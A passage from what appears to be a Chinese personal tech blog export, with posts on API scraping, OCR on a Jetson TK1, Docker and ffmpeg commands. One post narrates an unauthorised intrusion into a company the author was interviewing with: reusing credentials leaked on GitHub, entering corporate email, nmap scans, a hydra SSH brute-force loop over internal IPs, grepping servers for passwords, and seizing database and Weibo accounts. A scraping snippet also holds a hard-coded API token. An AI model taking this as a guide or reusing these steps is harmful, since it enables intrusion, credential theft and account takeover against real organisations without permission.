class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> request = <span class=\"built_in\">require</span>(<span class=\"string\">\"request\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> options = &#123; <span class=\"attr\">method</span>: <span class=\"string\">'GET'</span>,</span><br><span class=\"line\">  url: <span class=\"string\">'http://wxapi.qichacha.com/wechat/v1/base/advancedSearch'</span>,</span><br><span class=\"line\">  qs: </span><br><span class=\"line\">   &#123; <span class=\"attr\">cityCode</span>: <span class=\"string\">''</span>,</span><br><span class=\"line\">     industryCode: <span class=\"string\">''</span>,</span><br><span class=\"line\">     isSortAsc: <span class=\"string\">''</span>,</span><br><span class=\"line\">     pageIndex: <span class=\"string\">'1'</span>,</span><br><span class=\"line\">     pageSize: <span class=\"string\">'200'</span>,</span><br><span class=\"line\">     province: <span class=\"string\">''</span>,</span><br><span class=\"line\">     registCapiBegin: <span class=\"string\">''</span>,</span><br><span class=\"line\">     registCapiEnd: <span class=\"string\">''</span>,</span><br><span class=\"line\">     searchIndex: <span class=\"string\">''</span>,</span><br><span class=\"line\">     searchKey: <span class=\"string\">'al'</span>,</span><br><span class=\"line\">     sortField: <span class=\"string\">''</span>,</span><br><span class=\"line\">     startDateBegin: <span class=\"string\">''</span>,</span><br><span class=\"line\">     startDateEnd: <span class=\"string\">''</span>,</span><br><span class=\"line\">     subIndustryCode: <span class=\"string\">''</span>,</span><br><span class=\"line\">     token: <span class=\"string\">'9ae78b92b16d04173d8caffbd7cf3c30'</span> &#125;,</span><br><span class=\"line\">  headers: </span><br><span class=\"line\">   &#123; <span class=\"string\">'cache-control'</span>: <span class=\"string\">'no-cache'</span>,</span><br><span class=\"line\">     <span class=\"string\">'x-requested-with'</span>: <span class=\"string\">'com.tencent.mm'</span>,</span><br><span class=\"line\">     <span class=\"string\">'accept-language'</span>: <span class=\"string\">'zh-CN,en-US;q=0.8'</span>,</span><br><span class=\"line\">     <span class=\"string\">'accept-encoding'</span>: <span class=\"string\">'gzip, deflate'</span>,</span><br><span class=\"line\">     referer: <span class=\"string\">'http://mob.qichacha.com/weixin-app/?code=&amp;state=123'</span>,</span><br><span class=\"line\">     <span class=\"string\">'user-agent'</span>: <span class=\"string\">'Mozilla/5.0 (Linux; Android 5.1; MX5 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.8 TBS/036872 Safari/537.36 MicroMessenger/6.3.31.940 NetType/WIFI Language/zh_CN'</span>,</span><br><span class=\"line\">     origin: <span class=\"string\">'http://mob.qichacha.com'</span>,</span><br><span class=\"line\">     accept: <span class=\"string\">'application/json, text/plain, */*'</span>,</span><br><span class=\"line\">     connection: <span class=\"string\">'keep-alive'</span>,</span><br><span class=\"line\">     host: <span class=\"string\">'wxapi.qichacha.com'</span> &#125; &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">request(options, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">error, response, body</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (error) <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(error);</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(body);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>不过可以从这里面看出来一个东西，就是模拟微信只需要在<code>user-Agent</code>里面加上<code>MicroMessenger</code> </p>\n<p><img src=\"/images//user-Agent.jpg\" alt=\"User-agent\"></p>\n<p>其实呢，你可以看到，里面之所以加了不同的浏览器版本，其实就是为了兼容(图片来自第一次在这里的技术分享%&gt;_&lt;%)。</p>\n<p>Other:</p>\n<p>后来，在尝试在hadoop上跑爬虫，又想到了一种的途径去获得连接并且去重，类似这样。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">lynx --dump -listonly http://qichahca.com | grep \"[http|https]://\" | awk '!a[$2]++'</span><br></pre></td></tr></table></figure>\n<p>也可以grep的时候，只匹配特定域名下的东西。</p>\n<p>后记:</p>\n<p>突然发现自己写的爬虫，可能算不上爬虫，我是习惯性的找到数据接口，API也好，找到规律也好，然后获取所有数据。这样的缺点是需要前面投入一些时间去分析。然后就简单了。 而我通过近期对公司分布式爬虫代码的阅读来看，或者说平常的代码来看，一旦页面变化，就需要修改对应的代码，一直都需要人来维护。但是API的就不会。同时，同样的请求，不需要请求其他无用的html内容。</p>\n<p>虽然自己也能写正常的爬虫，但是对于分布式爬虫还是有点不行。最近在看本司分布式爬虫的代码。设计什么的还好理解，架构也好理解。但是吧，代码没文档，真是丑。决定试试分布式爬虫框架以及大型爬虫在hadoop上怎么搞的。</p>\n","categories":["HowTo"],"tags":["抓取数据","实习笔记"]},{"title":"浅谈OCR在Jeston TK1上的产品化两种解决方案","url":"http://iami.xyz/2016/11/22/Ocr-Jeston-Tk1-In/","content":"<blockquote>\n<p>一直关注Video++这家公司。自从看到了在招OCR算法工程师，并负责评估TK1上的产品化。恰好毕业设计在做Tk1上的文本识别(算是体会到水了)，就勉强写一下吧。我感觉这个做出来的东西肯定不太便宜，个人不一定玩的起。</p>\n<p>如我所理解，机器学习只是数据挖掘的一种方法，而数据挖掘最终目的也是在某一个领域内或者多个领域内进行迁移，得到相应的解决方法。因此在在做Robocup 3d simulation 的时候就有意识的往上面应用一些方法，当然我最大的心愿就是Use ML With Penetration. 相信未来安全领域和AI领域以及各种机器人一定一片沃土。</p>\n</blockquote>\n<p>首先：拆掉风扇，风扇这个东西吧，噪音太大，必须拆掉。因为热的并不是很大到不可接受。</p>\n<p>两种方案</p>\n<ul>\n<li>A: Tesseract</li>\n</ul>\n<blockquote>\n<p> <a href=\"http://tesseract.projectnaptha.com/\" target=\"_blank\" rel=\"noopener\">Tesseract.js</a> + <a href=\"http://gpu.rocks/\" target=\"_blank\" rel=\"noopener\">gpu.js</a></p>\n<p>Tesseract是一款众所周知的开源OCR，但是Tesseract.js可能知道的就不多了，但是他的github的star数比Tesseract多了不少吧。纯浏览器端加载，也可以npm导入作为后端调用。使用简单，效率不凡。由于提到了说要利用GPU的计算能力，初步以为使用gpu.js重写数据结构和计算部分。</p>\n</blockquote>\n<ul>\n<li>B: DeepLearning with <a href=\"http://caffe.berkeleyvision.org/\" target=\"_blank\" rel=\"noopener\">Caffe</a></li>\n</ul>\n<blockquote>\n<p> 这个思路简单，类似交叉编译。就是在自己的机器上把模型训练好，<font color=\"green\">安装GPU模式的caffe到Jeston Tk1 </font>, 然后写代码<font color=\"green\">调用训练好模型</font>处理现在的数据进行OCR即可。</p>\n<blockquote>\n<ul>\n<li>问题1: Jeston Tk1上的caffe安装耗时耗利，且cudnn的版本会导致不能启用GPU模式。<br>解决方案: docker 部署，直接pull下来docker hub上封装好的GPU模式的caffe。这样对产品化，量产有了一定的保障。但其实Tk1的刷机也比较麻烦，对网络环境的要求是自由的，安装过程中，出现依赖有时候还需要手动安装。</li>\n</ul>\n<ul>\n<li>问题2：Jeston Tk1上的docker安装(docker.io ,docker-engine)，docker安装成功之后daemon进程无法启动，始终无法启动。<br>解决方案:未知，issued(目前由于信息不完善被关闭了，等在这边安定之后，try again)</li>\n</ul>\n<ul>\n<li>问题3：汉字不同英文，需要收集的数据集太大。而且数据有需要精准标注，耗费人力物力巨大。且由于不同的书法体，楷体，行楷，隶书等”规矩”的字体还好说，但是向草书，笔走龙蛇之势，普通人都难以辨别，尚需书法家，何况机器。<br>解决: 未知，不过这个属于算法部分。</li>\n</ul>\n</blockquote>\n</blockquote>\n<p>最后的最后， 回家三天停电两天，不得不服。另相遇海知，十分开心。</p>\n<p>综上:不敢妄下断言。可行度大概七八成。但是考虑到部署和板子本身的成本问题批量生产其实并不乐观。一块板子一千六左右。</p>\n<font color=\"red\">update 2016/12/12:</font>\n\n<p>从github上跑的一个<a href=\"https://github.com/pannous/caffe-ocr\" target=\"_blank\" rel=\"noopener\">caffe-ocr</a>，其中会有一部分是不存在的文件，只要删除掉，基本就行了。<br>可行性还是很高的。印刷体的话基本上是没什么挑战性的。中文的有一个数据集 CAISA-HWDB。来上海的这些天，突然觉得上海的消费水平，相对于这里的生活水平其实这个板子也是便宜的可以了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#delete TimesNewRoman-10-4.png TimesNewRoman-10-3.png imesNewRoman-10-1.png TimesNewRoman-10-5.png TimesNewRoman-10-2 TimesNewRoman-6-1.png</span></span><br><span class=\"line\">$   sed -i <span class=\"string\">'/TimesNewRoman-10-5.png/d'</span> `ls | grep _index`</span><br><span class=\"line\">$ \tsed -i <span class=\"string\">'s/GPU/CPU/g'</span> alpha_solver.prototxt \t<span class=\"comment\">#我的是CPU模式的，看你自己的情况</span></span><br><span class=\"line\">$   caffe train -solver alpha_solver.prototxt</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images//caffe-ocr.jpg\" alt=\"caffe-ocr\"> </p>\n<p>other: Docker说是不支持armhf的，所以如果安装caffe的话还是需要手动安装。<br>但是不一定局限于caffe，可以安装Tensorflow，Theano.</p>\n","categories":["HowTo"],"tags":["学习笔记"]},{"title":"Docker for daily use","url":"http://iami.xyz/2016/11/13/Docker-useage/","content":"<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker run -i -t --name alias_container_name images_name </span><br><span class=\"line\">$ docker attach container_id</span><br></pre></td></tr></table></figure>\n<h3 id=\"someUser-don’t-need-root\"><a href=\"#someUser-don’t-need-root\" class=\"headerlink\" title=\"someUser don’t need root\"></a>someUser don’t need root</h3><p><code>sudo usermod -aG docker someUser</code></p>\n<h3 id=\"stop-docker-container\"><a href=\"#stop-docker-container\" class=\"headerlink\" title=\"stop docker container\"></a>stop docker container</h3><p><code>$ docker stop container_id</code></p>\n<h3 id=\"export-single-file-from-runing-container\"><a href=\"#export-single-file-from-runing-container\" class=\"headerlink\" title=\"export single file from runing container\"></a>export single file from runing container</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker cp name.txt container_name:/name.txt</span><br><span class=\"line\">$ docker cp container_name:/name.txt name.txt</span><br></pre></td></tr></table></figure>\n<h3 id=\"delete-force-or-not\"><a href=\"#delete-force-or-not\" class=\"headerlink\" title=\"delete force or not\"></a>delete force or not</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker rm container</span><br><span class=\"line\">$ docker rmi images</span><br><span class=\"line\">$ dcoker rmi -f images | docker rm -f container_id</span><br></pre></td></tr></table></figure>\n<h3 id=\"remove-all-stoped-container\"><a href=\"#remove-all-stoped-container\" class=\"headerlink\" title=\"remove all stoped container\"></a>remove all stoped container</h3><p><code>$ docker rm $(docker ps -a -q)</code></p>\n<h3 id=\"kill-containers-and-remove-them\"><a href=\"#kill-containers-and-remove-them\" class=\"headerlink\" title=\"kill containers and remove them:\"></a>kill containers and remove them:</h3><p><code>$ docker rm $(docker kill $(docker ps -aq))</code></p>\n<h3 id=\"remove-all-images\"><a href=\"#remove-all-images\" class=\"headerlink\" title=\"remove all images\"></a>remove all images</h3><p><code>$ docker rmi $(docker images -qf &quot;dangling=true&quot;)</code></p>\n<p><code>docker rmi $(docker images | grep -v &#39;ubuntu\\|my-image&#39; | awk {&#39;print $3&#39;})</code></p>\n<h3 id=\"mount-the-directory-to-docker\"><a href=\"#mount-the-directory-to-docker\" class=\"headerlink\" title=\"mount the directory to docker\"></a>mount the directory to docker</h3><p><code>$ docker run -d P --name mnistDemo -v .:/mnistDemo caffe:latest /bin/bash</code></p>\n<h3 id=\"link-container\"><a href=\"#link-container\" class=\"headerlink\" title=\"link container\"></a>link container</h3><p><code>docker run -i -t --name container1 --net=my-network --net-alias=container1 ubuntu:trusty /bin/bash</code></p>\n<h3 id=\"docker-expose-port\"><a href=\"#docker-expose-port\" class=\"headerlink\" title=\"docker expose  port\"></a>docker expose  port</h3><p><code>$ docker run -d -p 80:80 my_image service nginx start</code></p>\n<p>References:</p>\n<ul>\n<li><p><a href=\"http://stackoverflow.com/questions/16047306/how-is-docker-different-from-a-normal-virtual-machine\" target=\"_blank\" rel=\"noopener\">how-is-docker-different-from-a-normal-virtual-machine</a></p>\n</li>\n<li><p><a href=\"http://stackoverflow.com/questions/21871479/docker-cant-connect-to-docker-daemon\" target=\"_blank\" rel=\"noopener\">docker-cant-connect-to-docker-daemon</a></p>\n</li>\n<li><p><a href=\"http://stackoverflow.com/questions/25324860/how-to-create-a-bidirectional-link-between-containers\" target=\"_blank\" rel=\"noopener\">how-to-create-a-bidirectional-link-between-containers</a></p>\n</li>\n<li><p><a href=\"https://docs.docker.com/engine/reference/commandline/build/\" target=\"_blank\" rel=\"noopener\">docker build</a></p>\n</li>\n<li><p><a href=\"https://docs.docker.com/engine/reference/commandline/commit/\" target=\"_blank\" rel=\"noopener\">docker commit</a></p>\n</li>\n</ul>\n","categories":["HowTo"],"tags":["学习笔记"]},{"title":"实习之登堂入室","url":"http://iami.xyz/2016/11/09/Get-all-server/","content":"<h1 id=\"但行好事，莫问前程\"><a href=\"#但行好事，莫问前程\" class=\"headerlink\" title=\"但行好事，莫问前程\"></a>但行好事，莫问前程</h1><blockquote>\n<p>解决方案</p>\n</blockquote>\n<ul>\n<li><font color=\"red\"> 删除Github上的敏感配置信息(包括但不限于微信Appkey,secert,Email账号，mlab上的DB配置，产品AppKey,Secert, ELK服务器账号密码等信息且不只是一个配置文件中出现)或着撤下Github上所有的公司产品代码 </font></li>\n<li><font color=\"red\">更改邮箱密码为复杂密码(但不止包括邮箱，其他可被搜索并和公司相关联的其他平台账号)，更改服务器为无规律密码(而非公司名加服务器功能加ip前几位构成)，</font></li>\n<li><font color=\"red\">更新数据库中已经暴露的数据。</font></li>\n<li><font color=\"red\">加强服务器配置，例如防SSH爆破，适当清理bash的history，设置白名单访问等</font></li>\n<li><font color=\"red\"> 重要信息不可放置到外网上。</font>\n\n\n</li>\n</ul>\n<h4 id=\"这是一次找实习之余，偶然接到这家公司的面试。出于对目标公司的好奇。当然只是作为对所中意公司的了解-之前是一点也不了解-，进行了小小的测试。目前所有已测试数据均已删除。不过经过此次测试发现越来越喜欢这家公司了。\"><a href=\"#这是一次找实习之余，偶然接到这家公司的面试。出于对目标公司的好奇。当然只是作为对所中意公司的了解-之前是一点也不了解-，进行了小小的测试。目前所有已测试数据均已删除。不过经过此次测试发现越来越喜欢这家公司了。\" class=\"headerlink\" title=\"这是一次找实习之余，偶然接到这家公司的面试。出于对目标公司的好奇。当然只是作为对所中意公司的了解(之前是一点也不了解)，进行了小小的测试。目前所有已测试数据均已删除。不过经过此次测试发现越来越喜欢这家公司了。\"></a>这是一次找实习之余，偶然接到这家公司的面试。出于对目标公司的好奇。当然只是作为对所中意公司的了解(之前是一点也不了解)，进行了小小的测试。目前所有已测试数据均已删除。不过经过此次测试发现越来越喜欢这家公司了。</h4><p>1.故事的开始。</p>\n<p>去官网看了一下，发现没有什么实质性的内容，而且不给注册。。好坑，不开心。而且只能从微信体验公司宣传的功能。于是抓包，看到API，猜了几次。觉得十分有趣。后来就去搜索引擎 <code>site:target.com</code> 不出意外发现了其他的相关域名。而且测试版的网站竟然还没下线(允许注册登录)。在这个网站注册了账号，尝试了一下基本功能，算是有了初步的了解。不过发现一个很不好的地方，就是API的设计，基本上全是用的GET，从后台取数据的时候，URL上一大串参数。而根据REST设计风格来看，其实这几个功能都应该是通过POST的方式，并且将请求的数据放到Body里比较好。 </p>\n<p>2.Github上的数据泄露</p>\n<p>一边从搜索引擎得到网站一些信息，然后去github尝试了一下，看看有没有人上传过代码。不尝试不知道，发现信息泄露十分严重。数个员工均在github上公开了代码。其中配置文件包括服务器，企业邮箱，db，ELK信息等。<br>拿出旁注工具，旁注得到域名<br><img src=\"/images//hackit/pangzhu_1.jpg\" alt=\"旁注得到域名\"></p>\n<p>同时登录企业邮箱，邮箱中并无重要信息。但是Get到了部分通讯录。有了通讯录就方便了很多。通讯录是Json格式的，看起来很费事，所以转成csv好点。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk '&#123;key = $1; $1 = \"\"; a[key] = a[key] $0&#125; END &#123; for (key in a) print key, a[key] &#125;' &lt;&lt;&lt; cat tt.txt  &gt;tempfile\t\t   #直接合并数据</span><br><span class=\"line\">sed -n '2,6p' tempfile\t\t\t#取第姓名行到第邮箱行</span><br><span class=\"line\">sed '2,3d' tempfile\t\t\t\t#删除姓名到邮箱中的多余的二行。</span><br><span class=\"line\">cat tempfile | sed 's/,/\\n/g'\t#以逗号进行的行列转置，但是转置之后全部变成一列了</span><br><span class=\"line\">paste name.txt mail.txt  | awk '&#123;printf \"%s %s %s \\n\", $1 ,\",\",$2 &#125;' &gt; ConnectInfo.csv \t\t\t\t\t#两个不同的文件合并成两列到一个文件\t\t\t\t  #</span><br></pre></td></tr></table></figure>\n<p>其实还可以用csvkit，csvkit的话一行命令就行了就<code>json2csv xx.json xx.csv</code>可以转成csv格式了。</p>\n<p>而另一边旁注得到的信息需要进行一下整理，看看是不是有多个站点共同使用一个IP上的。不同工具不同字典大小，可以得到不同的结果。</p>\n<blockquote>\n<p>使用<br><code>awk &#39;{key = $1; $1 = &quot;&quot;; a[key] = a[key] $0} END { for (key in a) print key, a[key] }&#39; &lt;&lt;&lt; cat IpInfo.txt</code></p>\n</blockquote>\n<p>得到整理好的数据，可以看到有三个ip上同时每个上面部署了两个站点。当然后来换了个字典，发现其实不止这么多二级域名，一共有16个的样子吧。<br><img src=\"/images//hackit/pangzhu_2.jpg\" alt=\"整理数据\"></p>\n<p>这边得到了iplist就应该开始进行扫描了。使用 <code>nmap -A -Pn -iL IPlist.txt &gt; IPScanresult.txt</code> 同时还有一个进行URL的扫描。当然这个时候我还在搜索信息。发现其使用一个XX部落，通过密码猜测进入。然后发现一个十分重要的东西。就是内网映射服务器的账号密码在那记载着呢。</p>\n<p><img src=\"/images//hackit/RUKOUVPS.png\" alt=\"进来了\"><br>进来之后发现其实还部署着docker，nginx，ELK等服务，但是这台服务器的性能上是真一般，而且网速超级慢。</p>\n<p>3.服务器之上</p>\n<blockquote>\n<p>进了服务器，开始看一下路由表映射，然后查看历史记录，在整个目录下递归搜索含有’pwd’,’password’,’xxx’的文件。查看历史记录发现<code>grep -rnw /home/ -e &#39;pwd&#39;</code></p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iplist=\"10.10.241.52</span><br><span class=\"line\">10.10.177.183</span><br><span class=\"line\">10.10.241.52</span><br><span class=\"line\">10.10.177.183</span><br><span class=\"line\">10.10.255.95</span><br><span class=\"line\">10.10.239.183</span><br><span class=\"line\">172.17.0.2</span><br><span class=\"line\">10.10.255.1</span><br><span class=\"line\">172.17.0.2</span><br><span class=\"line\">10.10.255.1</span><br><span class=\"line\">10.10.220.103</span><br><span class=\"line\">10.10.255.92</span><br><span class=\"line\">10.10.200.143</span><br><span class=\"line\">10.10.166.86</span><br><span class=\"line\">10.10.255.93</span><br><span class=\"line\">10.10.84.141</span><br><span class=\"line\">10.10.200.122</span><br><span class=\"line\">10.10.0.1</span><br><span class=\"line\">10.10.255.90</span><br><span class=\"line\">10.10.200.4</span><br><span class=\"line\">10.10.255.2</span><br><span class=\"line\">10.10.255.200</span><br><span class=\"line\">10.10.255.250</span><br><span class=\"line\">10.10.232.79\"</span><br><span class=\"line\"> </span><br><span class=\"line\">echo \"===Begin TEST===\"</span><br><span class=\"line\">for ip in $iplist;</span><br><span class=\"line\">do</span><br><span class=\"line\">          hydra $ip -s 50001 ssh -l root -P passlist.txt</span><br><span class=\"line\">done</span><br></pre></td></tr></table></figure>\n<p>OVER_by_2016_11_12</p>\n<p>现在是第二天早上11点(周日)：刚写完邮件通知对方。</p>\n<p>ps:其他过程不想写了，昨天搞到将近两点，本来还打算看看面试题呢。不过也没什么可看的。哎，通知了对方。有的人说不要，有的人说要。还是，但行好事，莫问前程。希望ok。</p>\n<p><img src=\"/images//hackit/attention.jpg\" alt=\"通知对方\"></p>\n<p>ps2:前几天和堂姐聊天，说要辞实习，重新找一份。姐说：年轻人就是好。是啊，年轻，棱角未平，阳光正好。现在我又佩服我的老姐了，能拿下全马，佩服你。</p>\n<p>update:14号上午，还是不想看面试题。昨天发邮件通知之后，也没人回复个谢谢。邮箱密码虽然改了，但服务器还是没有修改。这次又测到4个DB服务器的账号密码。</p>\n<p><img src=\"/images//hackit/msg1.jpg\" alt=\"DBMSG\"></p>\n<p>问了下HR面试我的面试官名字，找到之后，微博,github,知乎。发现我们两个的学习路线差不多。不知道今天下午的面试会怎么样？OK,嘿嘿。<br>update:14号上午11:00，好吧官方微博账号到手。</p>\n<p><img src=\"/images//hackit/weibo.png\" alt=\"weibohh\"></p>\n","categories":["HowTo"],"tags":["实习笔记"]},{"title":"ffmpeg Simpley Useage","url":"http://iami.xyz/2016/11/01/Image-Parse/","content":"<p>###前几天公司的人去北京参加一个视频搜索的比赛，然后发回来组委对数据处理的要求</p>\n<p><img src=\"/images//imageParser.jpg\" alt=\"imageParser\"></p>\n<ul>\n<li>画中画</li>\n</ul>\n<blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ffmpeg -y -i o_oC.mp4 -i y1.MP4 \\</span><br><span class=\"line\">-strict experimental \\</span><br><span class=\"line\">-filter_complex \\</span><br><span class=\"line\">\"[1:a] atrim=15:30,adelay=5000|5000 [a1]; \\</span><br><span class=\"line\">[0:a][a1] amix [outa]; \\</span><br><span class=\"line\">[1:v] scale=120:-1,setpts=PTS-(10/TB) [1v]; \\</span><br><span class=\"line\">[0:v][1v] overlay=x=250:y=250:enable='between(t,5,200)'[outv]\" \\</span><br><span class=\"line\">-map \"[outv]\" -map \"[outa]\" \\</span><br><span class=\"line\">-c:a aac -c:v libx264 \\</span><br><span class=\"line\">-b:v 1000k \\</span><br><span class=\"line\">-r 24 \\</span><br><span class=\"line\">output.mp4</span><br></pre></td></tr></table></figure>\n</blockquote>\n<ul>\n<li>视频增加中图片</li>\n</ul>\n<blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ffmpeg -i y1.MP4 -i image.jpg \\</span><br><span class=\"line\">-filter_complex \"[0:v][1:v] overlay=25:25:enable='between(t,0,2)'\" \\</span><br><span class=\"line\">-pix_fmt yuv420p -c:a copy \\</span><br><span class=\"line\">addImage.mp4</span><br></pre></td></tr></table></figure>\n<p>可以通过修改between达到插入一段时间或者1秒,scale可以用来控制插入前后的比例。overlay的x,y分别是距离左上角的偏移量。-strict experimental和-strict -2的效果相同，但必须紧跟在-i选项之后，否则报错。</p>\n</blockquote>\n<ul>\n<li>视频压缩</li>\n</ul>\n<blockquote>\n<p><code>ffmpeg -i y2.MP4 -acodec mp2 --psnr 1 compress.mp4</code><br>之前对官网做性能优化的时候，把mp4转webm也能降低视频大小，但是视频压缩并不一定降低视频大小。</p>\n</blockquote>\n<ul>\n<li>Gamma变换</li>\n</ul>\n<blockquote>\n<p><code>ffmpeg -i y1.MP4 -strict -2 -vf &quot;eq=gamma=0.5&quot; gammaChange.mp4</code></p>\n</blockquote>\n<ul>\n<li>增加白噪音</li>\n</ul>\n<blockquote>\n<p><code>ffmpeg -i y7.MP4 -strict -2 -filter_complex &quot;aevalsrc=-2+random(0)&quot; noise.mp4</code></p>\n</blockquote>\n<ul>\n<li>丢帧</li>\n</ul>\n<blockquote>\n<p><code>avconv -r 24 -i src.mov -an -vf fps=fps=12 output.mov</code></p>\n</blockquote>\n<ul>\n<li>增加字幕</li>\n</ul>\n<blockquote>\n<p><code>ffmpeg -i y1.MP4 -f srt -i a.srt -c:v copy -c:a copy -c:s mov_text addSrt.mp4</code></p>\n</blockquote>\n<ul>\n<li>Reference Cut picture in Video</li>\n</ul>\n<blockquote>\n<p><code>ffmpeg -ss [start] -i in.mp4 -t [duration] -c copy out.mp4</code></p>\n</blockquote>\n<font color=\"green\"> Update:2017.06.16  </font>\n\n<ul>\n<li>取3,5秒的视屏转化为gif图片</li>\n</ul>\n<blockquote>\n<p><code>ffmpeg -v warning -ss 3 -t 5 -i input.wmv -vf scale=3000:-1 -gifflags +transdiff -y sample.gif</code></p>\n</blockquote>\n<p>###Other</p>\n<p>下面链接所附，只做参考，部分命令不能使用。以上所有列出代码，均自己使用过的。PS:总是说有时间有时间，其实，我不知道啊。。啊，我的毕设毕设。还有我给你定的拖拉那么多的事情。</p>\n<p>###Resources</p>\n<ul>\n<li><a href=\"http://stackoverflow.com/questions/4010832/ffmpeg-compress-video\" target=\"_blank\" rel=\"noopener\">ffmpeg-compress-video</a></li>\n<li><a href=\"http://stackoverflow.com/questions/8672809/use-ffmpeg-to-add-text-subtitles\" target=\"_blank\" rel=\"noopener\">use-ffmpeg-to-add-text-subtitles</a></li>\n<li><a href=\"http://superuser.com/questions/377343/cut-part-from-video-file-from-start-position-to-end-position-with-ffmpeg\" target=\"_blank\" rel=\"noopener\">cut-part-from-video-file</a></li>\n<li><a href=\"http://stackoverflow.com/questions/15792105/simulating-tv-noise\" target=\"_blank\" rel=\"noopener\">simulating-tv-noise</a></li>\n<li><a href=\"http://stackoverflow.com/questions/2553448/encode-video-in-reverse\" target=\"_blank\" rel=\"noopener\">encode-video-in-reverse</a></li>\n<li><a href=\"http://superuser.com/questions/849739/how-do-i-reduce-frame-rate-without-increasing-duration\" target=\"_blank\" rel=\"noopener\">reduce-frame</a></li>\n<li><a href=\"https://en.wikibooks.org/wiki/FFMPEG_An_Intermediate_Guide/image_sequence\" target=\"_blank\" rel=\"noopener\">image_sequence</a></li>\n<li><a href=\"http://blog.pkh.me/p/21-high-quality-gif-with-ffmpeg.html\" target=\"_blank\" rel=\"noopener\">video_convert_image</a></li>\n</ul>\n","categories":["全栈工程师"],"tags":["实习笔记"]},{"title":"Crawl From Little IV","url":"http://iami.xyz/2016/10/10/feipin-info/","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>一个月前的一次信息抓取，数据不多，信息是上海市的废品回收站。没什么可说的。代码也简单，不过问题还是在代码上。最开始用R，因为rvest包提取表格的效果很好。后来还是不行，就只有用python了。</p>\n<p><img src=\"/images//crawl/feipininfo.jpg\" alt=\"feipin\"></p>\n<figure class=\"highlight r\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span 